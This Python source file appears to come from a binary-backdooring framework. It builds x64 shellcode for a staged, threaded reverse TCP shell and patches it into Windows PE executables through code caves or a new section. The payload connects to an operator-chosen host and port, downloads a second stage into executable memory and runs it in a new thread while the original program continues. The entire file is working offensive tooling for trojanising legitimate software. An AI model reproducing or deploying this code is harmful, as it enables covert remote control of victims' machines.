import struct
import os
import logging
from core import enum
from core import support

from pe.core import eat_code_caves
from common import common
logger = logging.getLogger(__name__)

class iat_reverse_tcp_staged_threaded():

    def __init__(self):
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "iat_reverse_tcp_staged_threaded"
        self.description = """Import Address Table reverse tcp shell """
        self.requirements = {'MODE':'How the patching will happen',
                             'HOST':'<HOST to connect back to>',
                             'PORT':'<Port to connect back to>',
                             'IDT_IN_CAVE': 'Put new imports in a existing cave',
                            }
        self.supported_modes = ['add_section',
                                'single_cave',
                                'cave_jumping'
                                ]
        self.shellcode = ""
        self.stackpreserve = bytes("\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50"
                              "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              , 'iso-8859-1')
        self.stackrestore = bytes("\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                             "\x41\x58\x5d\x5c\x5f\x5e\x5a\x59\x5b\x58", 'iso-8859-1'
                             )
        self.apis_needed = [b'LoadLibraryA', b'GetProcAddress',
                                 b'VirtualAlloc', b'CreateThread']
        self.payload_type = 'staged'
   
    def invoke(self, PM):
        # Expose patching method objects
        
        self.PM = PM
        # no encoders for this payload
        self.PM.found_encoder = False
        # Expose BDF method objects
        self.BDF = self.PM.BDF
        logger.debug(f"IN PAYLOAD DEBUG: {dir(self)}")
        if support.support(self).check_reqs() is False:
            return False
        return self.run()

    def run(self):
        """
        Completed IAT based payload includes spawning of thread.
        """

        for api in self.apis_needed:
            if api not in self.PM.BDF.pe_object:
                logger.error(f"API not found: {api}")
                return False
        
        #get_payload:  #Jump back with the address for the payload on the stack.
        if self.MODE.lower() == 'cave_jumping':
            self.shellcode2 = b"\xe8"
            breakupvar = eat_code_caves.eat_code_caves(self.PM.BDF.pe_object, 0, 1)
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                   len(self.shellcode2) + 99).rstrip('L')), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                   breakupvar + 99).rstrip('L')), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                             len(self.shellcode2) + 71).rstrip('L')), 16))
        else:
            self.shellcode2 = b"\xE8\xBA\xFF\xFF\xFF"

        #Can inject any shellcode below.
        if self.MODE.lower() != 'add_section':
            if 'CavesPicked' in self.BDF.pe_object:
                self.shellcode2 += self.PM.BDF.pe_object['CleanCavesStub']

            else:
                self.shellcode2 += b"\x41" * 90

        self.shellcode2 += b"\xfc"                   # CLD
        self.shellcode2 += b"\x55\x48\x89\xE5"       # mov rbp, rsp
        self.shellcode2 += b"\x48\x31\xD2"           # xor rdx, rdx
        self.shellcode2 += b"\x65\x48\x8B\x52\x60"   # mov rdx, QWORD ptr gs: [rdx+0x60]
        self.shellcode2 += b"\x48\x8B\x52\x10"       # mov rdx, Qword ptr [rdx + 10]
        # rdx now module entry
        self.shellcode2 += b"\x49\xBE"               # mov value below to r14

        if self.PM.BDF.pe_object[b'LoadLibraryA'] - self.PM.BDF.pe_object['ImageBase'] < 0:
            self.shellcode2 += struct.pack("<Q", 0xffffffff + (self.PM.BDF.pe_object[b'LoadLibraryA'] - self.PM.BDF.pe_object['ImageBase'] + 1))
        else:
            self.shellcode2 += struct.pack("<Q", self.PM.BDF.pe_object[b'LoadLibraryA'] - self.PM.BDF.pe_object['ImageBase'])
        #RDX holds entry point
        self.shellcode2 += b"\x49\x01\xD6"           # add r14 + RDX
        self.shellcode2 += b"\x49\xBF"               # mov value below to r15
        if self.PM.BDF.pe_object[b'GetProcAddress'] - self.PM.BDF.pe_object['ImageBase'] < 0:
            self.shellcode2 += struct.pack("<Q", 0xffffffff + (self.PM.BDF.pe_object[b'GetProcAddress'] - self.PM.BDF.pe_object['ImageBase'] + 1))
        else:
            self.shellcode2 += struct.pack("<Q", self.PM.BDF.pe_object[b'GetProcAddress'] - self.PM.BDF.pe_object['ImageBase'])
        self.shellcode2 += b"\x49\x01\xD7"           # add r15 + RDX
        # LoadLibraryA in r14
        # GetProcAddress in r15

        self.shellcode2 += bytes("\x49\xbb\x77\x73\x32\x5F\x33\x32\x00\x00"       # mov r11, ws2_32
                            "\x41\x53"                                       # push r11
                            "\x49\x89\xE3"                                   # mov r11, rsp
                            "\x48\x81\xEC\xA0\x01\x00\x00"                   # sub rsp, 408+8     # size of WSAData
                            "\x48\x89\xE6"                                   # mov rsi, rsp pointer to WSAData struct
                            "\x48\xBF\x02\x00"
                            , 'iso-8859-1')
        self.shellcode2 += struct.pack('!H', int(self.PORT))
        self.shellcode2 += common.pack_ip_addresses(self.HOST)
        self.shellcode2 += bytes("\x57"                                           # push rdi
                            "\x48\x89\xE7"                                   # mov rdi, rsp pointer to data
                            "\x4C\x89\xD9"                                   # mov rcx, r11 #ws2_32
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xff\x16"                                   # call qword ptr [r14] ; LoadLibA
                            "\x49\x89\xC5"                                   # mov r13, rax ; handle ws2_32 to r13
                            #  handle ws2_32 to r13
                            "\x48\x89\xC1"                                   # mov rcx, rax
                            "\xeb\x0c"                                       # short jmp over api
                            "\x57\x53\x41\x53\x74\x61"                       # WSAStartup
                            "\x72\x74\x75\x70\x00\x00"                       # ...
                            "\x48\x8D\x15\xED\xFF\xFF\xFF"                   # lea rdx, [rip-19]
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xFF\x17"                                   # Call qword ptr [r15] ; GetProcAddr
                            "\x48\x95"                                       # xchg rbp, rax ; mov wsastartup to rbp
                            # wsastartup to rbp
                            "\xeb\x0c"                                       # jmp over WSASocketA
                            "\x57\x53\x41\x53\x6f\x63"                       # WSASocketA
                            "\x6b\x65\x74\x41\x00\x00"                       #
                            "\x48\x8D\x15\xED\xFF\xFF\xFF"                   # lea rdx, [rip-19]
                            "\x4C\x89\xE9"                                   # mov rcx, r13
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xFF\x17"                                   # call qword ptr [r15] GetProcAddr WSASocketA
                            "\x49\x94"                                       # xchg r12, rax ; mov WSASocketA to r12
                            # WSASocketA to r12
                            "\x48\x89\xF2"                                   # mov rdx, rsi ; mov point to struct
                            "\x68\x01\x01\x00\x00"                           # push 0x0101
                            "\x59"                                           # pop rcx
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20

                            "\xff\xd5"                                       # call rbp ; WSAStartup(0x0101, &WSAData);

                            "\x50"                                           # push rax
                            "\x50"                                           # push rax
                            "\x4D\x31\xC0"                                   # xor r8, r8
                            "\x4D\x31\xC9"                                   # xor r9, r9
                            "\x48\xff\xC0"                                   # inc rax
                            "\x48\x89\xC2"                                   # mov rdx, rax
                            "\x48\xff\xC0"                                   # inc rax
                            "\x48\x89\xC1"                                   # mov rdx, rax
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xFF\xD4"                                   # call r12 ;WSASocketA(AF_INT, SOCK_STREAM, 0 0 0 0)
                            "\x49\x94"                                       # xchg r12, rax ; mov socket to r12
                            # get connect
                            "\x48\xBA\x63\x6F\x6E\x6E\x65\x63\x74\x00"       # mov rdx, "connect\x00"
                            "\x52"                                           # push rdx
                            "\x48\x89\xE2"                                   # mov rdx, rsp
                            "\x4C\x89\xE9"                                   # mov rcx, r13; ws2_32 handle
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xFF\x17"                                   # call qword ptr [r15] ;GetProcAddr connect
                            "\x48\x89\xC3"                                   # mov rbx, rax ;connect api
                            "\x6A\x10"                                       # push 16
                            "\x41\x58"                                       # pop r8
                            "\x48\x89\xFA"                                   # mov rdx, rdi
                            "\x4C\x89\xE1"                                   # mov rcx, r12
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\xFF\xD3"                                       # call rbx ;connect (s, &sockaddr, 16)
                            , 'iso-8859-1')
        # socket is in r12
        # rdi has the struct for the socket
        # r14: LoadLibraryA
        # r15: GetProcAddress
        # r13 has ws2_32 handle
        # reminder: RCX, RDX, R8, R9 for the first four integer or pointer arguments
        self.shellcode2 += bytes("\x90\x90\x90\x90"
                            #get recv handle
                            "\x4C\x89\xE9"                                  # mov rcx, r13 ; ws2_32 handle in rcx
                            "\x48\xBA\x72\x65\x63\x76\x00\x00\x00\x00"      # mov rdx, recv
                            "\x52"                                          # push rdx
                            "\x48\x89\xe2"                                  # mov rdx, rsp
                            "\x48\x83\xEC\x20"                              # sub rsp, 0x20
                            "\x41\xFF\x17"                                  # call qword ptr [r15]; getprocaddr recv
                            "\x49\x89\xC5"                                  # mov r13, rax ; don't need ws2_32 handle
                            "\x48\x81\xC4\xD0\x02\x00\x00"                  # add rsp, 0x2F8
                            "\x48\x83\xec\x10"                              # sub rsp, 16
                            "\x48\x89\xe2"                                  # mov rdx, rsp
                            "\x4D\x31\xC9"                                  # xor r9, r9
                            "\x6a\x04"                                      # push byte 0x4
                            "\x41\x58"                                      # pop r8
                            "\x4C\x89\xE1"                                  # mov rcx, r12; socket
                            "\x48\x83\xEC\x20"                              # sub rsp, 0x20
                            "\x41\xFF\xD5"                                  # call r13; recv
                            "\x48\x83\xC4\x20"                              # add rsp, 32 ;need to restore the stack
                            "\x5e"                                          # pop rsi ; size of second stage
                            , 'iso-8859-1')
        self.shellcode2 += bytes("\x48\x31\xD2"                                  # xor rdx, rdx
                            "\x65\x48\x8B\x52\x60"                          # mov rdx, QWORD ptr gs: [rdx+0x60]
                            "\x48\x8B\x52\x10"                              # mov rdx, QWORD ptr [rdx + 10]
                            , 'iso-8859-1')
        # rdx now module entry
        self.shellcode2 += b"\x49\xBE"                                       # mov value below to r14

        if self.PM.BDF.pe_object[b'VirtualAlloc'] - self.PM.BDF.pe_object['ImageBase'] < 0:
            self.shellcode2 += struct.pack("<Q", 0xffffffff + (self.PM.BDF.pe_object[b'VirtualAlloc'] - self.PM.BDF.pe_object['ImageBase'] + 1))
        else:
            self.shellcode2 += struct.pack("<Q", self.PM.BDF.pe_object[b'VirtualAlloc'] - self.PM.BDF.pe_object['ImageBase'])
        self.shellcode2 += b"\x49\x01\xD6"  # add r14 + RDX
        # r14 now holds VirtualAlloc

        self.shellcode2 += bytes("\x6a\x40"                                      # push byte 0x40
                            "\x41\x59"                                      # pop r9
                            "\x68\x00\x10\x00\x00"                          # push 0x1000
                            "\x41\x58"                                      # pop r8
                            "\x48\x89\xf2"                                  # mov rdx, rsi
                            "\x48\x31\xc9"                                  # xor rcx, rcx
                            "\x48\x83\xEC\x20"                              # sub rsp, 0x20
                            "\x41\xff\x16"                                  # call r14; call VirtualAlloc
                            "\x48\x89\xc3"                                  # mov rbx, rax
                            "\x49\x89\xC7"                                  # mov r15, rax
                            "\x4D\x31\xC9"                                  # xor r9, r9
                            "\x49\x89\xF0"                                  # mov r8, rsi
                            "\x48\x89\xDA"                                  # mov rdx, rbx
                            "\x4C\x89\xE1"                                  # mov rcx, r12
                            "\x48\x83\xEC\x20"                              # sub rsp, 0x20
                            "\x41\xFF\xD5"                                  # call r13; recv
                            "\x48\x01\xC3"                                  # add rbx, rax
                            "\x48\x29\xC6"                                  # sub rsi, rax
                            "\x48\x85\xF6"                                  # test rsi, rsi
                            "\x75\xe2"                                      # jnz short -X
                            "\x4C\x89\xE7"                                  # mov rdi, r12 ; socket to rdi
                            "\x41\xFF\xE7"                                  # jmp r15
                            , 'iso-8859-1')

        # allocate
        self.shellcode1 = b"\xfc"
        self.shellcode1 += b"\x49\xBE"                                       # mov value below to r14

        if self.PM.BDF.pe_object[b'VirtualAlloc'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']) < 0:
            self.shellcode1 += struct.pack("<Q", 0xffffffff + (self.PM.BDF.pe_object[b'VirtualAlloc'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']) + 1))
        else:
            self.shellcode1 += struct.pack("<Q", self.PM.BDF.pe_object[b'VirtualAlloc'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']))
        # RDX holds entry point
        self.shellcode1 += b"\x49\x01\xD6"                                   # add r14 + RDX
        self.shellcode1 += b"\x49\xBF"                                       # mov value below to r15
        if self.PM.BDF.pe_object[b'CreateThread'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']) < 0:
            self.shellcode1 += struct.pack("<Q", 0xffffffff + (self.PM.BDF.pe_object[b'CreateThread'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']) + 1))
        else:
            self.shellcode1 += struct.pack("<Q", self.PM.BDF.pe_object[b'CreateThread'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']))
        self.shellcode1 += b"\x49\x01\xD7"                                   # add r15 + RDX

        # r14 virtualalloc
        # r15 createthread

        self.shellcode1 += (b"\x5d"                                          # pop rbp
                            b"\x49\xc7\xc5"                                  # mov r13, size of payload...
                            )
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)
        self.shellcode1 += bytes("\x6a\x40"                                      # push 40h
                            "\x41\x59"                                      # pop r9 now 40h
                            "\x68\x00\x10\x00\x00"                          # push 1000h
                            "\x41\x58"                                      # pop r8.. now 1000h
                            "\x4C\x89\xEA"                                  # mov rdx, r13
                            "\x6A\x00"                                      # push 0
                            "\x59"                                          # pop rcx
                            "\x48\x83\xEC\x20"                              # sub rsp, 0x20
                            "\x41\xFF\x16"                                  # call qword ptr [r14]
                            "\x48\x89\xc3"                                  # mov rbx, rax      ; Store allocated address in rbx
                            "\x48\x89\xc7"                                  # mov rdi, rax      ; Prepare RDI with the new address
                            , 'iso-8859-1')
        self.shellcode1 += b"\x48\xc7\xc1"
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)

        #call the get_payload right before the payload
        if self.MODE.lower() == 'cave_jumping':
            self.shellcode1 += b"\xe9"
            breakupvar = eat_code_caves.eat_code_caves(self.PM.BDF.pe_object, 0, 1)
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += b"\xeb\x41"

                            # got_payload:
        self.shellcode1 += bytes("\x5e"                                     # pop rsi            ; Prepare ESI with the source to copy
                            "\xf2\xa4"                                      # rep movsb          ; Copy the payload to RWX memory
                            "\xe8\x00\x00\x00\x00"                          # call set_handler   ; Configure error handling
                            #^^^^ I could delete this need to fix jmp, call, and stack
                            #set_handler:
                            "\x48\x31\xC0"                                  # xor rax,rax
                            "\x50"                                          # push rax          ; LPDWORD lpThreadId (NULL)
                            "\x50"                                          # push rax          ; DWORD dwCreationFlags (0)
                            "\x49\x89\xC1"                                  # mov r9, rax        ; LPVOID lpParameter (NULL)
                            "\x48\x89\xC2"                                  # mov rdx, rax        ; LPTHREAD_START_ROUTINE lpStartAddress (payload)
                            "\x49\x89\xD8"                                  # mov r8, rbx         ; SIZE_T dwStackSize (0 for default)
                            "\x48\x89\xC1"                                  # mov rcx, rax        ; LPSECURITY_ATTRIBUTES lpThreadAttributes (NULL)
                            "\x48\x83\xEC\x20"                              # sub rsp, 0x20
                            "\x41\xFF\x17"                                  # call qword ptr [r15]
                            "\x48\x83\xC4\x50"                              # add rsp, 50

                            #stackrestore
                            "\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                            "\x41\x58\x5d\x5f\x5e\x5a\x59\x5b\x58"
                            , 'iso-8859-1')

        # Jump to the win64 return to normal execution code segment.
        if self.MODE.lower() == 'cave_jumping':
            self.shellcode1 += b"\xe9"
            breakupvar = eat_code_caves.eat_code_caves(self.PM.BDF.pe_object, 0, 2)

            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3).rstrip('L')), 16))
        else:
            self.shellcode1 += b"\xe9"
            self.shellcode1 += struct.pack("<I", len(self.shellcode2))

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return self.stackpreserve + self.shellcode1, self.shellcode2
